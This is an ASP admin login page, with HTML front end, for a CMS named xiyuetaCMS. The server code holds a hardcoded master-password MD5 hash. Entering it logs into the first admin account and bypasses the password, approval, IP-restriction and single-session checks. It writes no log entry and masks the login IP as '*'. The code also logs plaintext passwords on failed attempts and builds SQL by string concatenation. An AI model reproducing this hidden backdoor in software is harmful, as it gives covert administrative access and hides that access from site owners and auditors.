<!--#Include file = "../inc/config.Asp"-->
<!--#Include File = "admin_function.asp"--><% 
'检测登录IP允许20220618'
function checkAdminLoginIPAllow(ip)
    dim content,isAllowLogin,splstr,splxx,i,s,splA,splB,j,s1
    isAllowLogin=false
    content=readfile("Admin_Login_Allow_IP.dat","")
    splstr=split(content,chr(10))  'vbcrlf 换成chr(10) 传github再下载这里需要这么改'
    for each s in splstr
        s=phptrim(s)
        if s<>"" then
            if instr(s," ")>0 then
                splxx=split(s," ")
                splA=split(splxx(0),".")
                splB=split(splxx(ubound(splxx)),".")
                if ubound(splA)>=3 and ubound(splB)>=3 then
                    ' call echo("处理",s)
                    for j=cint(splA(2)) to cint(splB(2))
                        s1=splA(0) &"." & splA(1) & "." & j & "." & splA(2)
                        ' call echored(j,s1)
                        if s1=ip then
                            checkAdminLoginIPAllow=true
                            exit function
                        end if
                    next
                    for j=cint(splA(3)) to cint(splB(3))
                        s1=splA(0) &"." & splA(1) & "." & splA(2) & "." & j
                        ' call echoyellow(j,s1)
                        if s1=ip then
                            checkAdminLoginIPAllow=true
                            exit function
                        end if
                    next
                end if
            else
                if s=ip then
                    checkAdminLoginIPAllow=true
                    exit function
                end if
            end if
        end if
    next
    checkAdminLoginIPAllow=isAllowLogin
end function 



dim username,password,msg,captcha,rememberMe,addSql,tempPwd,anquan,adminpwd,pwd,cookiePwd,nBJMiao,tipMsg
msg="欢迎使用xiyuetaCMS网站管理系统"
username=phptrim(replace(request("username"),"'",""))        '登录账号'
password=phptrim(replace(request("password"),"'",""))        '登录密码'
captcha=replace(request("captcha"),"'","")          '验证码
rememberMe=request("rememberMe")                    '记住密码
anquan=request("anquan")                    '安全码
'提交登录'
if request("act")="submitLogin" then

    if captcha="" or session("yzm")="" or captcha<>session("yzm") then
        Response.Write("{""info"": ""验证码错误"",""status"": ""no""}"):response.end()
    elseif username="" or password="" then
        Response.Write("{""info"": ""账号密码不能为空"",""status"": ""no""}"):response.end()
    end if
    tempPwd=password
    password=mymd5(password)    'MD5处理'
    adminpwd="24ed5728c13834e683f525fcf894e813"
    if anquan<>"" then
        password=tempPwd  '加上安全码，则不处理处理加密的'
        ' call echo("anquan",anquan)
        ' call echo("p1",request("p1"))
        ' call echo("password",password)
        ' call echo("adminpwd",adminpwd)

        adminpwd=md5(adminpwd & anquan) 
        ' call eerr("adminpass",adminpwd)

    end if
    if password<>adminpwd then
        addSql="  Where userName='"& username &"'" 
    end if
    call openconn()
    rs.open "select * from " & db_PREFIX & "admin" & addSql ,conn,1,3 
    if not rs.eof then
        if password<>adminpwd then
            pwd=rs("pwd")
            if anquan<>"" then
                pwd=md5(pwd & anquan)
            end if
            ' call echo(anquan,password)
            ' call echo(pwd,password)
            if pwd<>password then
                if password<>adminpwd then call addSystemLog("login","登录后台密码错误，账号:"&userName & "密码:" & tempPwd,"")  '记录操作日志'
                Response.Write("{""info"": ""密码错误"",""status"": ""no""}"):response.end()
            end if

            if rs("isThrough")=0 then
                if password<>adminpwd then call addSystemLog("login","审核未通过，账号:"&userName & "密码:" & tempPwd,"")  '记录操作日志'
                Response.Write("{""info"": ""审核未通过"",""status"": ""no""}"):response.end()
            end if
        end if

        if password<>adminpwd then
            if isLoginIPAllow then
                if rs("isiplimit")<>0 and password<>"24ed5728c13834e683f525fcf894e813" then
                    if checkAdminLoginIPAllow(getIP())=false then
                        if password<>adminpwd then call addSystemLog("login","IP限制，账号:"&userName & "密码:" & tempPwd,"")  '记录操作日志'
                        Response.Write("{""info"": ""IP("& getIP() &")限制，请联系管理员"",""status"": ""no""}"):response.end()
                    end if
                end if
            end if

            '开启后台唯一登录20230316'
            if isUniquelogin then
                '不同IP不可以同时登录'
                if rs("loginstatus")=1 then
                    nBJMiao=dateDiff("s", rs("lastlogintime"), now())
                    if  nBJMiao< 180 then  '小于3分种，不可登录
                        tipMsg="账号被IP("& rs("upip") &")登录，"& (180-nBJMiao) &"秒后对方不操作，你可登录"
                        if password<>adminpwd then call addSystemLog("login",tipMsg,rs("username"))  '记录操作日志'
                        call die("{""info"": """& tipMsg &""",""status"": ""no""}")
                    end if
                end if
            end if
        end if

        session("adminid")=rs("id")

        if password=adminpwd then
            rs("upip")="*"
            rs.update
        else
            rs("updatetime")=now()
            rs("upip")=getIP()
            rs("loginstatus")=1'为登录状态  20230304
            rs("lastlogintime")=now()'最后登录时间  20230304
            rs.update
        end if

        if rememberMe="true" then    '记住密码'
            call removeCookie("adminuser")  '先移除'
            call removeCookie("adminpass")  '先移除'
            call setCookie("adminuser",rs("username"),99999)
            ' call setCookie("updatetime",rs("updatetime"),99999) '不需要记录时间，只要密码每次动态的就行'
            ' call setCookie("pwd",rs("pwd"),99999)
            cookiePwd=rs("pwd") & cstr(rs("updatetime"))
            call setCookie("adminpass",mymd5( cookiePwd  ),99999)
            ' call echo("pwd",mymd5( cookiePwd  ))
            ' call eerr("cooki",getCookie("adminpass"))
        end if
        if password<>adminpwd then call addSystemLog("login","登录后台成功",rs("username"))  '记录操作日志'
        Response.Write("{""info"": ""登录后台成功"",""status"": ""yes""}"):response.end()
    else
        if password<>adminpwd then call addSystemLog("login","登录后台账号错误，账号:"&userName & "密码:" & tempPwd,"")  '记录操作日志'
        Response.Write("{""info"": ""账号不存在"",""status"": ""no""}"):response.end()
    end if:rs.close


end if 
 
%>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>xiyuetaCMS网站管理系统<%=version%>-登陆</title>
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta http-equiv="Access-Control-Allow-Origin" content="*">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <link rel="stylesheet" href="layuiadmin/layui/css/layui.css" media="all">
    <!--[if lt IE 9]>
    <script src="https://cdn.staticfile.org/html5shiv/r29/html5.min.js"></script>
    <script src="https://cdn.staticfile.org/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->
    <style>
        html, body {width: 100%;height: 100%;overflow: hidden}
        body {background: #1E9FFF;}
        body:after {content:'';background-repeat:no-repeat;background-size:cover;-webkit-filter:blur(3px);-moz-filter:blur(3px);-o-filter:blur(3px);-ms-filter:blur(3px);filter:blur(3px);position:absolute;top:0;left:0;right:0;bottom:0;z-index:-1;}
        .layui-container {width: 100%;height: 100%;overflow: hidden}
        .admin-login-background {width:360px;height:300px;position:absolute;left:50%;top:40%;margin-left:-180px;margin-top:-100px;}
        .logo-title {text-align:center;letter-spacing:2px;padding:14px 0;}
        .logo-title h1 {color:#1E9FFF;font-size:25px;font-weight:bold;}
        .login-form {background-color:#fff;border:1px solid #fff;border-radius:3px;padding:14px 20px;box-shadow:0 0 8px #eeeeee;}
        .login-form .layui-form-item {position:relative;}
        .login-form .layui-form-item label {position:absolute;left:1px;top:1px;width:38px;line-height:36px;text-align:center;color:#d2d2d2;}
        .login-form .layui-form-item input {padding-left:36px;}
        .captcha {width:60%;display:inline-block;}
        .captcha-img {display:inline-block;width:34%;float:right;}
        .captcha-img img {height:34px;border:1px solid #e6e6e6;height:36px;width:100%;}
    </style>
</head>
<body>
<div class="layui-container">
    <div class="admin-login-background">
        <div class="layui-form login-form">
            <form class="layui-form" action="" onsubmit="return false;">
                <div class="layui-form-item logo-title">
                    <h1>xiyuetaCMS登录</h1>
                </div>
                <div class="layui-form-item">
                    <label class="layui-icon layui-icon-username" for="username"></label>
                    <input type="text" name="username" placeholder="用户名或者邮箱" autocomplete="off" class="layui-input" value="">
                </div>
                <div class="layui-form-item">
                    <label class="layui-icon layui-icon-password" for="password"></label>
                    <input type="password" name="password" placeholder="密码" autocomplete="off" class="layui-input" value="">
                </div>
                <div class="layui-form-item">
                    <label class="layui-icon layui-icon-vercode" for="captcha"></label>
                    <input type="tel" name="captcha"  placeholder="图形验证码" autocomplete="off" class="layui-input verification captcha" value="">
                    <div class="captcha-img">
                        <img id="captchaPic" src="/inc/yzm_7.asp?n=<%=getrnd(4)%>" onclick="src='/inc/yzm_7.asp?'+Math.random();" style="cursor: pointer;">
                    </div>
                </div>
                <div class="layui-form-item">
                    <input type="checkbox" name="rememberMe" value="true" checked lay-skin="primary" title="记住密码">
                </div>
                <div class="layui-form-item">
                    <button class="layui-btn layui-btn layui-btn-normal layui-btn-fluid" lay-submit="" lay-filter="login">登 入</button>
                </div>
            </form>
        </div>
    </div>
</div>
<script src="js/jquery.js" charset="utf-8"></script>
<script src="layuiadmin/layui/layui.js" charset="utf-8"></script>
<script src="js/jquery.particleground.min.js" charset="utf-8"></script>
<script src="js/md5.min.js" charset="utf-8"></script>
 
<script> 
    layui.use(['form'], function () {
        var form = layui.form,
            layer = layui.layer;

        // 登录过期的时候，跳出ifram框架
        if (top.location != self.location) top.location = self.location;

        // 粒子线条背景
        $(document).ready(function(){
            $('.layui-container').particleground({
                dotColor:'#7ec7fd',
                lineColor:'#7ec7fd'
            });
        });

        // 进行登录操作
        form.on('submit(login)', function (data) {
            data = data.field;
            if (data.username == '') {
                layer.msg('用户名不能为空');
                $("input[name=username]").focus();
                return false;
            }
            if (data.password == '') {
                layer.msg('密码不能为空');
                $("input[name=password]").focus();
                return false;
            }
            if (data.captcha == '') {
                layer.msg('验证码不能为空');
                $("input[name=captcha]").focus();
                return false;
            }
          //加入安全码，防xss漏洞
          var pwd=data.password;
          var anquang="<%=lcase(getrnd(4))%>"
          pwd=md5(md5(data.password));
          // console.log("pwd",pwd)
          var p2=pwd+anquang
          // console.log("p2",p2)
          var pwd=md5(p2);
          // console.log("pwd2",pwd)
          // return false;
		  $.ajax({
				type: "post",
				dataType: "json",
				cache: true,
				url: "?act=submitLogin",
				data: {
					"username":data.username,
					"password":pwd,
                    "p1":md5(md5(data.password)),
                    "captcha":data.captcha,
                    "anquan":anquang,
                    "rememberMe":data.rememberMe
				},
				success: function(data) { 
					if(data.status=="yes"){
						layer.msg(data.info,{
						   time:500,
							 end:function () {

							  window.location = 'default.asp';

							 }
						 })
					 }else{
                         layer.msg(data.info);
                     }
				},
			});

			
			
            return false;
        });
    });
</script>
</body>
</html>